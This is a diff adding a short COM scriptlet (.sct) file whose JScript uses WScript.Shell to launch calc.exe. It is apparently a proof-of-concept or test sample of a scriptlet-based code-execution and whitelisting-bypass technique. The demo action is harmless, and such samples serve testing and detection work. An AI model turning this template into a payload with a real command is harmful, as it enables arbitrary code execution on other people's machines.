@@ -1,0 +1,16 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+  description="test"
+  progid="test"
+  version="1.00"
+  remotable="true" >
+</registration>
+
+<script language="JScript">
+<![CDATA[
+  var a = new ActiveXObject("WScript.Shell").Run("calc.exe");
+]]>
+</script>
+</scriptlet>
